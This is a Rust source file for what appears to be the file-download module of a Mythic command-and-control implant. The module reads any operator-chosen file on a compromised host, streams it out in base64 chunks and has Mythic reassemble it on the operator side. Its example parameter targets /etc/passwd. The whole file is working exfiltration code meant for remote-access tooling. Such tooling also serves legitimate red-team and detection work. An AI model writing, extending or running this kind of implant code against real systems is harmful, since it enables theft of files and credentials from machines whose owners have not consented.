//! File download (agent → Mythic) — multi-chunk, streaming.
//!
//! Reads the file in fixed-size chunks from disk and emits one [`TaskDownload`]
//! response per chunk, all sharing a single `file_id`. Mythic reassembles them
//! into a single file on the operator side.
//!
//! Memory usage: bounded to [`DEFAULT_CHUNK_SIZE`] regardless of file size —
//! safe for files larger than available RAM.
//!
//! Multi-response emission: chunk responses are pushed via [`crate::push_extra`]
//! and the agent loop appends them to the next `get_tasking` round. The single
//! `TaskResponse` returned by `handle` is the final summary.
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "path": "/etc/passwd",
//!     "host": "optional-hostname",
//!     "chunk_size": 524288   // optional, bytes (default 512 KiB)
//! }
//! ```

use std::fs::File;
use std::io::{Read, Seek, SeekFrom};
use std::path::Path;

use base64::Engine;
use mythic::{TaskDownload, TaskMessage, TaskResponse};
use serde::Deserialize;
use uuid::Uuid;

use crate::push_extra;

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    path: String,
    #[serde(default)]
    host: Option<String>,
    /// Chunk size in bytes (default 512 KiB). Clamped to [64 KiB, 8 MiB].
    #[serde(default)]
    chunk_size: Option<u32>,
}

// ── Constants ───────────────────────────────────────────────

const DEFAULT_CHUNK_SIZE: u32 = 512 * 1024; // 512 KiB
const MIN_CHUNK_SIZE: u32 = 64 * 1024; // 64 KiB
const MAX_CHUNK_SIZE: u32 = 8 * 1024 * 1024; // 8 MiB
/// Hard ceiling on total file size to prevent runaway disk reads.
const MAX_TOTAL_SIZE: u64 = 4 * 1024 * 1024 * 1024; // 4 GiB

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("download parse error: {e}")),
    };

    let path = Path::new(&params.path);
    let filename = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "unknown".into());
    let full_path = path.to_string_lossy().to_string();
    let host = params.host;

    // 1. Open file and get total size
    let mut file = match File::open(path) {
        Ok(f) => f,
        Err(e) => {
            return TaskResponse::failed(
                task.id,
                &format!("read {} failed: {e}", path.display()),
            )
        }
    };
    let total_size = match file.metadata() {
        Ok(m) => m.len(),
        Err(e) => {
            return TaskResponse::failed(
                task.id,
                &format!("stat {} failed: {e}", path.display()),
            )
        }
    };
    if total_size > MAX_TOTAL_SIZE {
        return TaskResponse::failed(
            task.id,
            &format!(
                "file too large: {} bytes (max {}); use a custom stager",
                total_size, MAX_TOTAL_SIZE
            ),
        );
    }

    // 2. Compute chunk params
    let chunk_size = params
        .chunk_size
        .unwrap_or(DEFAULT_CHUNK_SIZE)
        .clamp(MIN_CHUNK_SIZE, MAX_CHUNK_SIZE);
    let total_chunks: u32 = if total_size == 0 {
        1
    } else {
        ((total_size + chunk_size as u64 - 1) / chunk_size as u64) as u32
    };
    let file_id = Uuid::new_v4();

    info!(
        "[download] {} ({} bytes) → {} chunks of {} bytes",
        full_path, total_size, total_chunks, chunk_size
    );

    // 3. Stream- read each chunk, base64-encode, push as extra response
    let mut buf = vec![0u8; chunk_size as usize];
    let mut bytes_sent: u64 = 0;
    let mut chunk_num: u32 = 0;

    while bytes_sent < total_size {
        chunk_num += 1;
        let to_read = ((total_size - bytes_sent) as usize).min(buf.len());
        let slice = &mut buf[..to_read];

        if let Err(e) = file.seek(SeekFrom::Start(bytes_sent)) {
            return TaskResponse::failed(
                task.id,
                &format!("seek {} failed at byte {}: {e}", path.display(), bytes_sent),
            );
        }
        if let Err(e) = file.read_exact(slice) {
            return TaskResponse::failed(
                task.id,
                &format!(
                    "read {} failed at byte {}/{}: {e}",
                    path.display(),
                    bytes_sent,
                    total_size
                ),
            );
        }

        let read_len = slice.len();
        let this_chunk_size = read_len as u32;
        let encoded = base64::engine::general_purpose::STANDARD.encode(slice);
        bytes_sent += read_len as u64;
        let is_last = bytes_sent >= total_size;

        push_extra(TaskResponse {
            task_id: task.id,
            completed: Some(is_last),
            status: Some(if is_last { "completed".into() } else { "processing".into() }),
            user_output: None,
            download: Some(TaskDownload {
                total_chunks: Some(total_chunks),
                chunk_size: Some(this_chunk_size),
                chunk_num: Some(chunk_num),
                chunk_data: Some(encoded),
                filename: Some(filename.clone()),
                full_path: Some(full_path.clone()),
                host: host.clone(),
                is_screenshot: false,
                file_id: Some(file_id),
            }),
            ..Default::default()
        });
    }

    // Final summary
    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(format!(
            "{} ({} bytes, {} chunks)",
            filename,
            total_size,
            chunk_num
        )),
        ..Default::default()
    }
}
